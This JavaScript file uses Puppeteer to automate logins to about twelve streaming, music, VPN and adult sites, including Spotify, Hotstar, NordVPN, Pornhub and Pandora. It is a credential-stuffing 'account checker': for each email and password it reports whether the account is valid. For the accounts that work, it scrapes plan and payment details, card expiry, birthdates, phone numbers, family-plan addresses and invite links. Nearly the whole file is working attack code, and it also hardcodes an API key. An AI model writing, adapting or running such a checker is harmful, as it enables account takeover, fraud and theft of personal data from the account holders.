let spotifyChecker = async (login, password, page) => {
        await page.goto("https://www.spotify.com/us/logout/");
        await page.goto("https://accounts.spotify.com/en/login/?continue=https:%2F%2Fwww.spotify.com%2Fapi%2Fgrowth%2Fl2l-redirect");
        await page.evaluate(() => document.querySelector("#login-username").value = "");
        await page.type('#login-username', login);
        await page.type('#login-password', password);
        await page.click('#login-button');
        // await page.waitFor(5000);
        var subType = true;

        try{
            //await page.goto("https://www.spotify.com/us/api/account/overview/");
            await page.waitForSelector("#profileMenu",{timeout:1500});
        }catch {
            subType = false;
        }

        if(page.url() === "https://accounts.spotify.com/login/?_locale=en-US&continue=https%3A//www.spotify.com/us/api/account/overview/" || page.url() === "https://accounts.spotify.com/en/login/?_locale=en-US&continue=https:%2F%2Fwww.spotify.com%2Fus%2Fapi%2Faccount%2Foverview%2F")
            subType = false;

        var checkResult = {
            validAccount: subType,
            accountLogin: {
                email: login,
                password: password
            },
            accountInfo:null
        };

        if(subType){
            // await page.goto("https://www.spotify.com/us/api/account/overview/");
            var innerText = await page.evaluate(() =>  {
                return fetch('https://www.spotify.com/us/api/account/overview/',{
                    method:"GET"
                }).then(res=>res.json()).then(res=>res)
            });
            // await page.goto("https://www.spotify.com/us/api/account/datalayer/");
            var datalayer = await page.evaluate(() =>  {
                return fetch('https://www.spotify.com/us/api/account/datalayer/',{
                    method:"GET"
                }).then(res=>res.json()).then(res=>res)
            });
            // await page.goto("https://www.spotify.com/api/account-settings/v1/profile/");
            var theProfile = await page.evaluate(() =>  {
                return fetch('https://www.spotify.com/api/account-settings/v1/profile/',{
                    method:"GET"
                }).then(res=>res.json()).then(res=>res)
            });
            // await page.goto("https://www.spotify.com/us/home-hub/api/v1/family/home/");
            var memberArea = await page.evaluate(() =>  {
                return fetch('https://www.spotify.com/us/home-hub/api/v1/family/home/',{
                    method:"GET"
                }).then(res=>res.json()).then(res=>res)
            });

            checkResult.accountInfo = {
                plan : innerText.props.plan.plan.name,
                username:theProfile.profile.username,
                gender:theProfile.profile.gender,
                birthdate:theProfile.profile.birthdate,
                third_party_email:theProfile.profile.third_party_email,
                country:innerText.props.profile.fields[innerText.props.profile.fields.length-1].value,
                accountDayAge: datalayer.accountAgeDays,
                isTrialUser:datalayer.isTrialUser,
                paymentInfo: null,
                members : null
            };
            if(datalayer.isSubAccount || datalayer.currentPlan === "free"){
                checkResult.accountInfo.paymentInfo = null;
                if(datalayer.isSubAccount)
                    checkResult.accountInfo.plan += ' | member';
            }else if(!datalayer.isSubAccount || !datalayer.isTrialUser){
                checkResult.accountInfo.plan += ' | owner';

                checkResult.accountInfo.paymentInfo = {
                    price : innerText.props.plan.paymentInfo.billingInfo.split(">")[1].split("<")[0],
                    nextBill:innerText.props.plan.paymentInfo.billingInfo.split(">")[3].split("<")[0],
                    expires:innerText.props.plan.paymentInfo.paymentMethod.expiry,
                    paymentMethod:innerText.props.plan.paymentInfo.paymentMethod.name
                }
            }
            if(memberArea.planType === "family" && memberArea.code !== "NOT_FOUND") {
                checkResult.accountInfo.members = [];
                if (memberArea.inviteToken) {
                    checkResult.accountInfo.inviteToken = "https://www.spotify.com/us/family/join/invite/" + memberArea.inviteToken;
                    checkResult.accountInfo.address = memberArea.address;
                    checkResult.accountInfo.maxCapacity = memberArea.maxCapacity;
                }
                var members = memberArea.members;
                for (var i = 0; i < members.length; i++) {
                    checkResult.accountInfo.members.push({
                        name: members[i].name,
                        isChildAccount: members[i].isChildAccount
                    })
                }
            }
        }
        console.log(checkResult);
        await page.goto("https://www.spotify.com/us/logout/");
        return  checkResult

};

let hotstarChecker = async (account,page)=>{
    if(!!account.login && validateEmail(account.login)){
        await page.goto("https://www.hotstar.com/in");
        await page.waitFor(5000);
        await page.evaluate(() => document.getElementsByClassName('signIn')[0].click());
        await page.waitFor(1000);
        await page.evaluate(() => document.getElementsByClassName('email-or-fb-signin')[0].click());
        await page.type('#emailID', account.login,{delay:100});
        await page.evaluate(()=> document.getElementsByClassName('submit-button')[0].click());
        await page.waitFor(2000);
       const otp = await page.evaluate(()=>{
            try {
               return !!document.getElementsByClassName('resend-code')[0]
            }
            catch {err} {
                return false;
            }
        });
       console.log(otp);
        var checkResult = {
            validAccount:true,
            otp:otp,
            accountLogin:{
                email:account.login,
                password:account.password
            },
            accountInfo:null
        };
       if(!otp){
           await page.type('#password', account.password,{delay:100});
           await page.waitFor(500);
           await page.evaluate(()=>document.getElementsByClassName('submit-button')[0].click());
           await page.waitFor(5000);
           const connected = await page.evaluate(()=> !document.getElementById('password'));
           checkResult.validAccount = connected;
           if(connected){
               await page.goto('https://www.hotstar.com/in/subscribe/my-account');
               await  page.waitFor(5000);
               checkResult.accountInfo =  await page.evaluate(()=>{
                   document.getElementsByClassName('billing-transactions-header')[0].click();
                   var paymentMethod= document.getElementsByClassName('card-name')[0] || {textContent:null};
                   var info = {
                       plan: document.getElementsByClassName('membership-title')[0].textContent,
                       nextBill:document.getElementsByClassName('membership-desc')[0].textContent,
                       paymentMethod:document.getElementsByClassName('mode')[0].textContent,
                       period:document.getElementsByClassName('peroid')[0].textContent,
                       amount:document.getElementsByClassName('amount')[0].textContent
                   };
                   document.getElementsByClassName('sign-out-link')[0].click();
                   return info;
               });
           }
       }
        return checkResult;
    }else {
        throw "enter valid cridential";
    }

};

let zee5Checker = async (account,page)=>{
    if(validateEmail(account.login) && !!account.password){
        await page.goto('https://userapi.zee5.com/v1/user/loginemail?email='+account.login+'&password='+account.password);
        var innerText = await page.evaluate(() =>  {
            return JSON.parse(document.querySelector("body").innerText);
        });
        var checkResult = {
            validAccount : false,
            accountLogin:{
                email:account.login,
                password:account.password
            }
        };
        if(innerText.token){
            console.log(true);
            checkResult.validAccount= true;
           const scraped =  await page.evaluate(()=>{
                const myHeaders = new Headers();
                myHeaders.append('X-Z5-Appversion', '17.0.0.6');
                myHeaders.append('X-Z5-AppPlatform', 'Android Mobile');
                myHeaders.append('Host', 'userapi.zee5.com');
                myHeaders.append('Connection', 'Keep-Alive');
                myHeaders.append('Accept-Encoding', 'gzip');
                myHeaders.append('Authorization', 'bearer '+ JSON.parse(document.querySelector("body").innerText).token);
                return fetch('https://subscriptionapi.zee5.com/v1/subscription?translation=en&include_active=true', {
                    method: 'GET',
                    headers: myHeaders,
                })
                    .then(response  => response.json())
                    .then(json => json[0]);
            });

            checkResult.accountInfo = {
                planType:scraped.subscription_plan.subscription_plan_type,
                planTitle:scraped.subscription_plan.title,
                state:scraped.state,
                freeTrial:scraped.free_trial,
                start: scraped.subscription_start,
                end:scraped.subscription_end,
                country:scraped.subscription_plan.country,
                numSup:scraped.subscription_plan.number_of_supported_devices,
                billingCycle:scraped.subscription_plan.billing_frequency,
                billingCycleType:scraped.subscription_plan.billing_cycle_type,
                valid_for_all_countries:scraped.subscription_plan.valid_for_all_countries,
                countries:scraped.subscription_plan.countries,
                price:scraped.subscription_plan.price + scraped.subscription_plan.currency
            };
            return checkResult;
        }
    }

};

let altbalajiChecker = async (account,page) => {
    var checkResult = {
        validAccount:false,
        accountLogin:{email:account.login,password:account.password},
        accountInfo:null
    };
    if(!!account.password  && validateEmail(account.login) ){
        await page.goto('https://api.cloud.altbalaji.com/accounts/lookup?login='+account.login+'&domain=IN');
        var innerText = await page.evaluate(() =>  {
            return JSON.parse(document.querySelector("body").innerText);
        });
        if(innerText.status){
          var scraped =  await page.evaluate((account)=>{
               var myHeaders = new Headers();
               myHeaders.append('Accept', 'application/json, text/plain, */*');
               myHeaders.append('Accept-Encoding', 'gzip, deflate, br');
               myHeaders.append('Accept-Language', 'en-US,en;q=0.9,fr;q=0.8,ar;q=0.7,de;q=0.6');
               myHeaders.append('Connection', 'Keep-Alive');
               myHeaders.append('Content-Length', '63');
               myHeaders.append('Host', 'api.cloud.altbalaji.com');
               myHeaders.append('Sec-Fetch-Dest', 'empty');
               return fetch('https://api.cloud.altbalaji.com/accounts/login?domain=IN', {
                   method: 'POST',
                   headers: myHeaders,
                   body:JSON.stringify({username: account.login, password:account.password})
               })
                   .then(response  => response.json())
                   .then(json => {
                       myHeaders.append('XSSESSION', json.session_token);
                      return fetch('https://api.cloud.altbalaji.com/accounts?Account_Id=4266539&Profile_Id=4266540&domain=IN', {
                           method: 'GET',
                           headers: myHeaders,
                       })
                           .then(response  => response.json())
                           .then(json => {
                                return fetch('https://payment.cloud.altbalaji.com/accounts/orders?domain=IN&limit=50',{
                                    method:'GET',
                                    headers:myHeaders
                                })
                                    .then(response => response.json())
                                    .then( payment=>{
                                        return  {
                                            surname:json.surname,
                                            name:json.name,
                                            type:json.type,
                                            gender:json.details.gender,
                                            state:json.details.state,
                                            email_verified:json.email_verified,
                                            paymentInfo:{
                                                payment_type:payment.orders[0].payment_type,
                                                amount:payment.orders[0].price.amount + payment.orders[0].price.amount.currency,
                                                is_free:payment.orders[0].price.is_free,
                                                start:payment.orders[0].dates.valid_from,
                                                end:payment.orders[0].dates.valid_to,
                                                status:payment.orders[0].status,
                                                is_trial:payment.orders[0].is_trial,
                                                payment_method:payment.orders[0].payment_method
                                            }
                                        }
                                    })
                           });
                   })
                   .catch(err => console.log(err));

           },account);
          if(scraped){
              checkResult.accountInfo = scraped;
              checkResult.validAccount = true;
          }
          if(!scraped){
              checkResult.validAccount = false;
              checkResult.accountInfo = null;
          }


        }

        return checkResult;
    }
};

let vootChecker = async (account,page) => {
    var checkResult = {
        validAccount:false,
        accountLogin:{email:account.login,password:account.password},
        accountInfo:null
    };
  await page.goto('https://us-central1-vootdev.cloudfunctions.net/usersV3/v3/checkUser');
  var scraped = await page.evaluate((account)=>{
      return fetch('https://us-central1-vootdev.cloudfunctions.net/usersV3/v3/login', {
          method: 'POST',
          headers:  { 'content-type': 'application/json' },
          body:JSON.stringify({"type":"traditional","deviceId":"Windows NT 10.0","deviceBrand":"PC/MAC","data":{"email":account.login,"password":account.password}})
      })
          .then(response  => response.json())
          .then(accinfo => {
              return fetch('https://pxapi.voot.com/smsv4/int/ps/v1/voot/transaction/list',{
                  method:"GET",
                  headers:  {
                      'content-type': 'application/json' ,
                      'accesstoken' : accinfo.data.authToken.accessToken
                  }
              })
                  .then(response  => response.json())
                  .then( payment => {
                      return {
                          age:accinfo.data.age,
                          mobile:accinfo.data.mobile,
                          languages:accinfo.data.languages,
                          birthDate:accinfo.data.birthDate,
                          firstName:accinfo.data.firstName,
                          profileName:accinfo.data.profileName,
                          lastName:accinfo.data.lastName,
                          gender:accinfo.data.gender,
                          isTemporaryPassword:accinfo.data.isTemporaryPassword,
                          isPasswordChangeable:accinfo.data.isPasswordChangeable,
                          paymentInfo:{
                              start:payment.results.list[0].startDate.gmtDate,
                              end:payment.results.list[0].endDate.gmtDate,
                              duration:payment.results.list[0].itemDetails.duration,
                              plan:payment.results.list[0].itemDetails.name,
                              isRenewable:payment.results.list[0].itemDetails.isRenewable,
                              price:payment.results.list[0].price.amount + payment.results.list[0].price.currency,
                              paymentMethod:payment.results.list[0].paymentDetails.extras.mode,
                              PaymentGateway:payment.results.list[0].paymentDetails.extras.PaymentGateway
                          }
                      }
                  });
          })
  },account);
  console.log(scraped);
    if(scraped){
        checkResult.accountInfo = scraped;
        checkResult.validAccount = true;
    }
    if(!scraped){
        checkResult.validAccount = false;
        checkResult.accountInfo = null;
    }
  return checkResult;
};

let sonylivChecker = async (account,page) => {
  await page.goto('https://api.sonyliv.com');
  const scraped = await page.evaluate((account)=>{
     return fetch('https://api.sonyliv.com/api/v4/auth/login', {
          method: 'POST',
          headers:  {
              'content-type': 'application/json',
              'User-Agent':'User-Agent: Dalvik/2.1.0 (Linux; U; Android 8.0.0; SSL Build/OPR6.170623.017)',
              "Host": "api.sonyliv.com",
              "x-via-device": "true"
          },
          body:JSON.stringify({"appClientId":" ",
              "contactPassword":account.password,
              "channelPartnerID":"MSMIND",
              "deviceType":"Android Phone",
              "advertisingId":"",
              "timestamp":"2020-10-26T10:33:29+0530",
              "serialNo":"",
              "contactUserName":account.login,
              "deviceName":"Google",
              "modelNo":"google Pixel 2",
              "gaUserId":" "})
      })
          .then(response  => response.json())
         .then(token => {
             return fetch('https://api.sonyliv.com/api/v1/subscription/getAllSubscriptions', {
                 method: 'POST',
                 headers:  {
                     'content-type': 'application/json',
                     'User-Agent':'Dalvik/2.1.0 (Linux; U; Android 8.0.0; SSL Build/OPR6.170623.017)',
                     "Host": "api.sonyliv.com",
                     "x-via-device": "true",
                     "Authorization":"Bearer "+ token.accessToken
                 },
                 body:JSON.stringify({"appClientId":"",
                     "channelPartnerID":"MSMIND",
                     "timestamp":"2020-10-26T10:33:29+0530",
                     "languageCode":"en_US",
                     "deviceName":"Google",
                     "modelNo":"google Pixel 2",
                 })
             })
                 .then(response  => response.json())
                 .then(subscription =>{
                     return subscription;
                 })
         })
  },account);
  console.log(scraped);
  return scraped;
};

let jiosaavnChecker = async (account,page) => {
    var checkResult = {
        validAccount:false,
        accountLogin:{email:account.login,password:account.password},
        accountInfo:null
    };
  await page.goto('https://www.jiosaavn.com/');
  const scraped = await page.evaluate((account)=>{
      let formData = new FormData();
      formData.append('username', account.login);
      formData.append('password', account.password);
      return fetch('https://www.jiosaavn.com/api.php?__call=user.login&api_version=4&_format=json&_marker=0&ctx=web6dot0', {
          method: 'POST',
          headers:  {
              'Orogin':'https://www.jiosaavn.com',
              "Host": "jiosaavn.com",
          },
          body:formData
          })
          .then(response  => response.json())
          .then(data => data)
          .catch(err => null)

  },account);

    if(scraped){
        checkResult.accountInfo = scraped;
        checkResult.validAccount = true;
    }
    if(scraped.error){
        checkResult.validAccount = false;
        checkResult.accountInfo = null;
    }
  console.log(scraped);
  return checkResult;
};

let nordvpnChecker = async (account,page) => {
   await page.goto('https://my.nordaccount.com/api/v1/users/tokens');
   var checkResult = {
       validAccount : false,
       accountInfo:null
   };
   const RequestToken = await page.evaluate((account)=>{
       return fetch('https://my.nordaccount.com/api/v1/users/tokens',{
           method:'POST',
           headers:{
               'Content-Type': "application/json" ,
               "Host": "api.nordvpn.com" ,
               "Connection": "keep-alive" ,
               "Accept": "application/json",
               "DNT2": 1 ,
               "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36" ,
               "Accept-Language":"en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7" ,
               "Accept-Encoding": "gzip, deflate",
           },
           body:JSON.stringify({
               username:account.login,
               password:account.password
           })

       }).then(res => res.json())
   },account);
    console.log(RequestToken.token);
   await page.goto('https://my.nordaccount.com/api/v1/users/services');
   const scraped = await page.evaluate((token)=>{
      return fetch('https://my.nordaccount.com/api/v1/users/services',{
                   method:'GET',
                   headers:{
                       "DNT": 1 ,
                       "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36" ,
                       "x-csrf-token": token,
                       "Authorization":token,
                       "Connection": "keep-alive",
                       "Accept": "*/*",
                       "Sec-Fetch-Site": "none" ,
                       "Sec-Fetch-Mode": "cors" ,
                       "Sec-Fetch-Dest": "" ,
                       "Accept-Encoding": "gzip, deflate"
                   }
           }).then(res => res.json())
             .then(sub => sub);
   },RequestToken.token);

   console.log(scraped);
   return checkResult;
};

let pornhubChecker = async (account,page) => {
    var checkResult = {
        validAccount : false,
        accountLogin:{
            email:account.login,
            password:account.password
        },
        accountInfo : null
    };
   await page.goto('https://www.pornhub.com/login');
   await page.waitFor(2000);
   const  scraped = await page.evaluate((account)=>{
       // var xhr1 = new XMLHttpRequest();
       // xhr1.open('POST', 'https://www.pornhub.com/front/authenticate');
       let data = new FormData();
       data.append('username', account.login);
       data.append('password', account.password);
       data.append('token', document.querySelector('input[name="token"]').value);
       data.append('from', 'pc_login_modal_:index');
       data.append('subscribe', '');
       data.append('setSendTip', false);
       // data.append('redirect', 'ENN9pwzDTaC6NvmWvmszV2KQVUSBedlTB5BMBe0jDfU');
       // xhr1.setRequestHeader('Pragma', 'no-cache');
       // xhr1.setRequestHeader('Accept','application/json, text/javascript, */*; q=0.01');
       // xhr1.send(data);
       return fetch('https://www.pornhub.com/front/authenticate',{
           method:'POST',
           headers:{
               'Pragma':'no-cache',
               'Accept':'application/json, text/javascript, */*; q=0.01'
           },
           body : data
       }).then(res => res.json()).then(acc => acc);
   },account);
   if(parseInt(scraped.success) || scraped.user_exists){
       checkResult.accountInfo = scraped;
       checkResult.validAccount = true;
   }
   console.log(scraped);
   return checkResult;
};

let wweChecker = async (account,page)=>{
    var checkResult = {
        validAccount :false,
        accountLogin:{
            email:account.login,
            password:account.password
        },
        accountInfo:null
    };
     await page.goto('https://dce-frontoffice.imggaming.com/api/v2/login');
     // await page.waitFor(1000);
    const tokenObj = await page.evaluate((account)=>{
        return fetch('https://dce-frontoffice.imggaming.com/api/v2/login',{
             method:'POST',
             headers:{
                 "accept":" */*" ,
                 "content-type": "application/json" ,
                 "accept-encoding": "gzip;q=1.0, compress;q=0.5" ,
                 "app": "dice" ,
                 "x-api-key": "ef59c096-d95d-428e-ad94-86385070dde2" ,
                 "realm": "dce.wwe" ,
                 "accept-language": "en-US;q=1.0" ,
                 "content-length": "47" ,
                 "user-agent": "WWE Network/4.43.0 (com.wwe.universal; build:12204; iOS 13.3.1) Alamofire/4.9.1"
             },
             body:JSON.stringify({
                 id: account.login,
                     // 'goodhannibal28@youtmail.tk',
                 secret:account.password
                     // 'goodhannibal28@youtmail.tk'
             })
         }).then(res=>res.json())
             .then(tokenObj => tokenObj)
     },account);
           if (tokenObj.code !== "NOT_FOUND"){
               checkResult.validAccount = true;
               checkResult.accountInfo = await page.evaluate((token)=>{
                  return fetch('https://dce-frontoffice.imggaming.com/api/v2/user/temporary/licences',{
                   method:'GET',
                       headers:{
                       "accept": "*/*",
                           "accept-encoding": "gzip;q=1.0, compress;q=0.5" ,
                           "app": "dice" ,
                           "if-none-match": "" ,
                           "x-api-key": "ef59c096-d95d-428e-ad94-86385070dde2" ,
                           "realm":"dce.wwe" ,
                           "accept-language": "en-US;q=1.0" ,
                           "authorization": "Bearer "+token
                   }
               }).then(res => res.json()).then(json => json)
           },tokenObj.authorisationToken);


           }

           return checkResult;
};

let scribdChecker = async (account,page) =>{
  var checkResult = {
      accountLogin: {
          email:account.login,
          password:account.password
      },
      validAccount:false,
      accountInfo:null
  };
  await page.goto('https://www.scribd.com/');
  const connect = await page.evaluate((account)=>{
      return fetch("https://www.scribd.com/csrf_token", {
          "headers": {
              "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
              "accept-language": "en-GB,en;q=0.9,en-US;q=0.8,ar;q=0.7,fr;q=0.6",
              "cache-control": "max-age=0",
              "if-none-match": "W/\"b696a7589f827807edda74fc78e21c6e\"",
              "sec-fetch-dest": "document",
              "sec-fetch-mode": "navigate",
              "sec-fetch-site": "none",
              "sec-fetch-user": "?1",
              "upgrade-insecure-requests": "1"
          },
          "referrerPolicy": "strict-origin-when-cross-origin",
          "body": null,
          "method": "GET",
          "mode": "cors",
          "credentials": "include"
      }).then(res=>res.json()).then(token=>{
          return fetch("https://www.scribd.com/login", {
              "headers": {
                  "accept": "*/*",
                  "accept-language": "en-US,en;q=0.9",
                  "content-type": "application/json",
                  "sec-fetch-dest": "empty",
                  "sec-fetch-mode": "cors",
                  "sec-fetch-site": "same-origin",
                  "x-csrf-token": token.csrf_token,
                  "x-requested-with": "XMLHttpRequest"
              },
              "referrer": "https://www.scribd.com/",
              "referrerPolicy": "strict-origin-when-cross-origin",
              "body": JSON.stringify({login_or_email:account.login,login_password:account.password,rememberme:"",signup_location:"https://www.scribd.com/",login_params:{}}),
              "method": "POST",
              "mode": "cors",
              "credentials": "include"
          })
              .then(res=>res.json())
              .then(i=>i);
      })
  },account);
  if(connect.login && connect.success){
      await page.goto('https://www.scribd.com/account-settings');
      await page.waitForSelector('.account_section');
      const scraped = await page.evaluate(()=>{
          var scrapedObj = {
              plan : "free",
              paymentInfo : null
          };
          if(document.querySelector('div.auto__base_component.auto__account_settings_sections_account > section > div:nth-child(2) > div.col_right > div > div > div').innerText !== "You do not have a membership.")
          {
              scrapedObj.plan = document.querySelector('div.auto__base_component.auto__account_settings_sections_account > section > div:nth-child(2) > div.col_right > div > div > div').innerText;
              scrapedObj.paymentInfo =document.querySelector('div.auto__base_component.auto__account_settings_sections_account > section > div:nth-child(3) > div.col_right > div.info').innerText;
              scrapedObj.full_name = document.querySelector('div.auto__base_component.auto__account_settings_sections_personal > section > div > div.col_right > div:nth-child(1) > div.middle > div.row > div').innerText;
          }
          return scrapedObj;
      });
      checkResult.accountInfo = scraped;
      checkResult.validAccount = true;
  }
  return checkResult;
};

let pandoraChecker = async (account,page) => {
   var checkResult = {
       validAccount : false,
       accountLogin:{
           email:account.login,
           password:account.password
       },
       accountInfo:null
   };
   await page.goto('https://www.pandora.com/account/sign-in');
   //await page.waitForSelector('.Form--dark');
   const login = await page.evaluate((account)=>{
       var parsedCookie = () => {return document.cookie
           .split(';')
           .reduce((res, c) => {
               const [key, val] = c.trim().split('=').map(decodeURIComponent)
               try {
                   return Object.assign(res, { [key]: JSON.parse(val) })
               } catch (e) {
                   return Object.assign(res, { [key]: val })
               }
           }, {})};
       return fetch("https://www.pandora.com/api/v1/auth/login", {
           "headers": {
               "accept": "application/json, text/plain, */*",
               "accept-language": "en-US,en;q=0.9,fr;q=0.8,ar;q=0.7,de;q=0.6",
               "content-type": "application/json",
               "sec-fetch-dest": "empty",
               "sec-fetch-mode": "cors",
               "sec-fetch-site": "same-origin",
               "x-csrftoken": parsedCookie().csrftoken
           },
           "referrer": "https://www.pandora.com/account/sign-in",
           "referrerPolicy": "strict-origin-when-cross-origin",
           "body": JSON.stringify({username:account.login,password:account.password,existingAuthToken:null,keepLoggedIn:true}),
           "method": "POST",
           "mode": "cors",
           "credentials": "include"
       }).then(res=>res.json()).then(e => {
           if(!!e.message && !parseInt(e.errorCode)){
               return e
               // {
               // birthYear: e.birthYear,
               // gender: e.gender,
               // zipcode: e.zipCode,
               // profilePrivate: e.profilePrivate,
               // emailOptOut: e.emailOptOut,
               // allowProfileComments: e.allowProfileComments,
               // notifyOnComment: e.notifyOnComment,
               // notifyOnFollow: e.notifyOnFollow,
               // artistPromoEmailsEnabled: e.artistPromoEmailsEnabled,
               // artistAudioMessagesEnabled: e.artistAudioMessagesEnabled,
               // isNew: e.isNew,
               // branding: e.config.branding,
               // dailySkipLimit: e.config.dailySkipLimit,
               // stationSkipLimit: e.config.stationSkipLimit,
               // inactivityTimeout: e.config.inactivityTimeout
               //     }
           }else {
               return e;
           }
       });
   },account);
   if (login){
       checkResult.accountInfo = login;
       checkResult.validAccount = true;
   }
   console.log(login);
   return checkResult;
};

module.exports = {
    spotifyChecker:spotifyChecker,
    hotstarChecker:hotstarChecker,
    zee5Checker:zee5Checker,
    altbalajiChecker:altbalajiChecker,
    vootChecker:vootChecker,
    sonylivChecker:sonylivChecker,
    jiosaavnChecker:jiosaavnChecker,
    nordvpnChecker:nordvpnChecker,
    pornhubChecker:pornhubChecker,
    wweChecker:wweChecker,
    scribdChecker:scribdChecker,
    pandoraChecker,pandoraChecker
};
////////////////////validate email/////////////////////////////
function validateEmail(email) {
    const re = /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
    return re.test(String(email).toLowerCase());
}
///////////////////////////////////////////////////////////////

